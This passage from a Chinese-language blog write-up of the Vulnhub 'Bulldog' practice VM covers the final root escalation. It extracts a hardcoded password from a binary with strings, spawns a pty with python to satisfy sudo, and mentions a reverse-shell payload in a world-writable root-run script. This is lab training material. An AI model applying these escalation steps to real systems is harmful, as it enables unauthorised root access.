<h2 id="最终解"><a href="#最终解" class="headerlink" title="最终解"></a>最终解</h2><h3 id="对customPermissionApp文件做一些手脚"><a href="#对customPermissionApp文件做一些手脚" class="headerlink" title="对customPermissionApp文件做一些手脚"></a>对customPermissionApp文件做一些手脚</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ cat customPermissionApp</span><br><span class="line">ELF&gt;�@@X@8	@@@@@@�88@8@@@ ``8@ ((`(`�TT@T@DDP�tdxx@x@44Q�tdR�td``��/lib64/ld-linux-x86-64.so.2GNU GNU��32S0-t���Ye?�ҏ��o</span><br><span class="line">                                                                                                                             !(: libc.so.6puts__stack_chk_failIuitem__S�`` `(`0`H�H��__gmon_start__GLIBC_2.4GLIBC_2.2.5ii</span><br><span class="line">                        H��t�[H���5�</span><br><span class="line">                                     �%�</span><br><span class="line">                                         @�%�</span><br><span class="line">                                              h������%z</span><br><span class="line">                                                        h������%r</span><br><span class="line">                                                                  h������%j</span><br><span class="line">                                                                            h�����%<span class="string">&quot;</span></span><br><span class="line"><span class="string">                                                                                     f�1�I��^H��H���PTI���@H���@H���@�����fD�O`UH-H`H��H��vH��t]�H`��f�]�@f.��H`UH��H`H��H��H��H��?H�H��t�H��t</span></span><br><span class="line"><span class="string">                                ]�H`��]�fD�=�</span></span><br><span class="line"><span class="string"> uUH���n���]��</span></span><br><span class="line"><span class="string"> ��@� `H�?u��H��t�UH����]�z���UH��H��pdH�%(H�E�1�@�����@@�����i@����H�SUPERultH�E�H�imatePASH�E�H�SWORDyouH�E�H�CANTgetH�E�H�U��H���H�H��H���H�u�dH34%(t�&#x27;�����DAWAVA��AUATL�%~ UH�-~ SI��I��L)�H�H������H��t 1��L��L��D��A��H��H9�u�H�[]A\A]A^A_Ðf.���H�H��Please enter a valid username to use root privileges	Usage: ./customPermissionApp &lt;username&gt;sudo su root;����h���P^�������x���zR����*zR�$����PFJ</span></span><br><span class="line"><span class="string">�                                                                                    �?;*3$&quot;</span>D�����A�C</span><br><span class="line">Dd8���eB�B�E �B(�H0�H8�M@r8A0A(B BB�`����@�@</span><br><span class="line">�@���o�@H@�@                                `@</span><br><span class="line">_</span><br><span class="line"> ``@�@  ���o�@���o���o�@(`�@�@�@�@GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 201606098@T@t@�@�@H@��@	�@</span><br><span class="line">@</span><br><span class="line"> `@</span><br><span class="line">�@�@�@@x@�@`` `(`�``8`H`��</span><br><span class="line">                           `@P@.�@DH`S`z�@�`������@� `���`�(`�`x@`+�@; � 8`WiH`5�@p���8`� �@`�@��@e�P`��@*H`�@� ,H`8</span><br><span class="line">                                                                                                                     `@crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.7585__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrycustomPermissionApp.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edata__stack_chk_fail@@GLIBC_2.4system@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment8@8<span class="comment">#T@T 1t@t$D���o�@N</span></span><br><span class="line">                                                                                                                                                     �@�VH@H_^���o�@�</span><br><span class="line">       k���o�@�z�@�B@�`@`��@�P����@���@�	�@�x@x4��@�� �(`(���8`H`0H4J</span><br><span class="line">                                                                            �x/ �R$</span><br></pre></td></tr></table></figure>

<ul>
<li>读取后发现是一个二进制文件，根据note提示好像可以直接提到note</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./ customPermissionApp django</span><br><span class="line">/bin/sh: 38: ./: Permission denied</span><br></pre></td></tr></table></figure>

<ul>
<li>提示没有权限，我就把它可读的都打印出来看看</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">$ strings customPermissionApp</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">32S0-t</span><br><span class="line">libc.so.6</span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">UH-H</span><br><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br><span class="line">dH34%(</span><br><span class="line">AWAVA</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Please enter a valid username to use root privileges</span><br><span class="line">	Usage: ./customPermissionApp &lt;username&gt;</span><br><span class="line">sudo su root</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br><span class="line"><span class="string">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</span></span><br><span class="line"><span class="string">crtstuff.c</span></span><br><span class="line"><span class="string">__JCR_LIST__</span></span><br><span class="line"><span class="string">deregister_tm_clones</span></span><br><span class="line"><span class="string">__do_global_dtors_aux</span></span><br><span class="line"><span class="string">completed.7585</span></span><br><span class="line"><span class="string">__do_global_dtors_aux_fini_array_entry</span></span><br><span class="line"><span class="string">frame_dummy</span></span><br><span class="line"><span class="string">__frame_dummy_init_array_entry</span></span><br><span class="line"><span class="string">customPermissionApp.c</span></span><br><span class="line"><span class="string">__FRAME_END__</span></span><br><span class="line"><span class="string">__JCR_END__</span></span><br><span class="line"><span class="string">__init_array_end</span></span><br><span class="line"><span class="string">_DYNAMIC</span></span><br><span class="line"><span class="string">__init_array_start</span></span><br><span class="line"><span class="string">__GNU_EH_FRAME_HDR</span></span><br><span class="line"><span class="string">_GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="string">__libc_csu_fini</span></span><br><span class="line"><span class="string">_ITM_deregisterTMCloneTable</span></span><br><span class="line"><span class="string">puts@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_edata</span></span><br><span class="line"><span class="string">__stack_chk_fail@@GLIBC_2.4</span></span><br><span class="line"><span class="string">system@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__libc_start_main@@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__data_start</span></span><br><span class="line"><span class="string">__gmon_start__</span></span><br><span class="line"><span class="string">__dso_handle</span></span><br><span class="line"><span class="string">_IO_stdin_used</span></span><br><span class="line"><span class="string">__libc_csu_init</span></span><br><span class="line"><span class="string">__bss_start</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">_Jv_RegisterClasses</span></span><br><span class="line"><span class="string">__TMC_END__</span></span><br><span class="line"><span class="string">_ITM_registerTMCloneTable</span></span><br><span class="line"><span class="string">.symtab</span></span><br><span class="line"><span class="string">.strtab</span></span><br><span class="line"><span class="string">.shstrtab</span></span><br><span class="line"><span class="string">.interp</span></span><br><span class="line"><span class="string">.note.ABI-tag</span></span><br><span class="line"><span class="string">.note.gnu.build-id</span></span><br><span class="line"><span class="string">.gnu.hash</span></span><br><span class="line"><span class="string">.dynsym</span></span><br><span class="line"><span class="string">.dynstr</span></span><br><span class="line"><span class="string">.gnu.version</span></span><br><span class="line"><span class="string">.gnu.version_r</span></span><br><span class="line"><span class="string">.rela.dyn</span></span><br><span class="line"><span class="string">.rela.plt</span></span><br><span class="line"><span class="string">.init</span></span><br><span class="line"><span class="string">.plt.got</span></span><br><span class="line"><span class="string">.text</span></span><br><span class="line"><span class="string">.fini</span></span><br><span class="line"><span class="string">.rodata</span></span><br><span class="line"><span class="string">.eh_frame_hdr</span></span><br><span class="line"><span class="string">.eh_frame</span></span><br><span class="line"><span class="string">.init_array</span></span><br><span class="line"><span class="string">.fini_array</span></span><br><span class="line"><span class="string">.jcr</span></span><br><span class="line"><span class="string">.dynamic</span></span><br><span class="line"><span class="string">.got.plt</span></span><br><span class="line"><span class="string">.data</span></span><br><span class="line"><span class="string">.bss</span></span><br><span class="line"><span class="string">.comment</span></span><br></pre></td></tr></table></figure>

<ul>
<li>我看到了！！！你看到了吗</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br><span class="line">dH34%(</span><br><span class="line">AWAVA</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Please enter a valid username to use root privileges</span><br><span class="line">	Usage: ./customPermissionApp &lt;username&gt;</span><br><span class="line">sudo su root</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里我们可以看到貌似<code>sudo su</code>之后就提权成功了我将上半部分整理了一下</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUPERultHimatePASHSWORDyouHCANTgetdH34%(</span><br><span class="line">SUPERultimatePASSWORDyouCANTget</span><br></pre></td></tr></table></figure>

<ul>
<li>提权</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>

<ul>
<li>这个该死的tty;导入pty</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">$ sudo su</span><br><span class="line">sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> django: SUPERultimatePASSWORDyouCANTget</span><br><span class="line"></span><br><span class="line">root@bulldog:/home/django/bulldog<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>导入pty，深刻怀疑之间也出现这样的情况，早点解决说不定权早就提了</li>
</ul>
<h2 id="拿到Flag"><a href="#拿到Flag" class="headerlink" title="拿到Flag"></a>拿到Flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@bulldog:/home/django<span class="comment"># cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@bulldog:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">congrats.txt</span><br><span class="line">root@bulldog:~<span class="comment"># cat congrats.txt</span></span><br><span class="line">cat congrats.txt</span><br><span class="line">Congratulations on completing this VM :D That wasn<span class="string">&#x27;t so bad was it?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let me know what you thought on twitter, I&#x27;</span>m @frichette_n</span><br><span class="line"></span><br><span class="line">As far as I know there are two ways to get root. Can you find the other one?</span><br><span class="line"></span><br><span class="line">Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!</span><br></pre></td></tr></table></figure>

<h3 id="另外种方法"><a href="#另外种方法" class="headerlink" title="另外种方法"></a>另外种方法</h3><ul>
<li>图丢了！！！下次补上；以root方式执行，并且是wxr权限的文件，是一个python文件 然后我们将payload写在里面运行后，我们回弹的shell就是root</li>
</ul>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2021/04/18/BullDog/" class="leancloud-visitors view" data-flag-title="BullDog-writeup">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2021/04/19/无密码SSH登录/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2021/04/17/内网横向（一）/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
    //     avatar:"monsterid",
    //     visitor: "true",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2021-04-18 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/靶机/">靶机<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/vulnhub靶机/">vulnhub靶机<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#BULLDOG"><span class="toc-article-text">BULLDOG</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-article-text">端口扫描</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F"><span class="toc-article-text">路径扫描</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#dirmap"><span class="toc-article-text">dirmap</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DirBruster"><span class="toc-article-text">DirBruster</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BD%91%E7%AB%99%E5%86%85%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">网站内敏感信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Content"><span class="toc-article-text">Content</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Webshell"><span class="toc-article-text">Webshell</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Hash%E7%88%86%E7%A0%B4%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="toc-article-text">Hash爆破进入后台</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#John%E7%88%86%E7%A0%B4%E7%8C%9C%E8%A7%A3Hash%E5%80%BC"><span class="toc-article-text">John爆破猜解Hash值</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8python%E7%BB%93%E5%90%88msf%E8%BF%9B%E8%A1%8C%E5%9B%9E%E5%BC%B9%EF%BC%88%E5%85%B6%E5%AE%9E%E5%9C%A8%E8%BF%99%E6%A0%B7%E7%9A%84%E9%9D%B6%E6%9C%BA%E4%B8%8Bnc%E8%B6%B3%E5%A4%9F%E4%BA%86%EF%BC%89"><span class="toc-article-text">使用python结合msf进行回弹（其实在这样的靶机下nc足够了）</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#linux%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">linux内的信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8Bdb-sqlite3-%E6%8B%BF%E5%88%B0administrator%E7%94%A8%E6%88%B7"><span class="toc-article-text">查看db.sqlite3 拿到administrator用户</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%86db-sqlite3%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-article-text">将db.sqlite3下载到本地</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9C%A8%E4%BD%BF%E7%94%A8Navicat-Premium%E6%9F%A5%E7%9C%8B"><span class="toc-article-text">在使用Navicat Premium查看</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%8A%E5%90%8E%E5%8F%B0%E4%B8%80%E6%97%A0%E6%89%80%E8%8E%B7%EF%BC%8C%E7%B4%A2%E7%84%B6%E6%97%A0%E5%91%B3"><span class="toc-article-text">上后台一无所获，索然无味</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8%E5%90%84%E7%A7%8DCVE%E6%8F%90%E6%9D%83%EF%BC%88%E8%BF%99%E9%87%8C%E5%9D%87%E5%A4%B1%E8%B4%A5%E4%BA%86%EF%BC%8C%E6%88%91%E5%B0%B1%E4%B8%8D%E6%8F%90%E4%BA%86%EF%BC%89"><span class="toc-article-text">使用各种CVE提权（这里均失败了，我就不提了）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9C%80%E7%BB%88%E5%A4%B1%E8%B4%A5%E6%98%AF%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E9%9D%B6%E6%9C%BA%E5%B0%B1%E6%B2%A1%E6%9C%89%E8%A3%85gcc%E7%8E%AF%E5%A2%83%EF%BC%88%E5%B1%9E%E4%BA%8E%E5%89%8D%E6%9C%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E5%A4%B1%E8%B4%A5%EF%BC%81%E6%B5%AA%E8%B4%B9%E6%88%91%E4%B8%80%E4%B8%AA%E4%B8%8B%E5%8D%88%EF%BC%89"><span class="toc-article-text">最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E%E5%8F%88%E4%B8%80%E6%9D%91"><span class="toc-article-text">柳暗花明又一村</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B7%A7%E5%90%88"><span class="toc-article-text">巧合</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8Bnote%E8%8E%B7%E5%8F%96%E6%8F%90%E7%A4%BA"><span class="toc-article-text">查看note获取提示</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9C%80%E7%BB%88%E8%A7%A3"><span class="toc-article-text">最终解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%B9customPermissionApp%E6%96%87%E4%BB%B6%E5%81%9A%E4%B8%80%E4%BA%9B%E6%89%8B%E8%84%9A"><span class="toc-article-text">对customPermissionApp文件做一些手脚</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8B%BF%E5%88%B0Flag"><span class="toc-article-text">拿到Flag</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%A6%E5%A4%96%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-article-text">另外种方法</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2021 zoukba's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 




   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
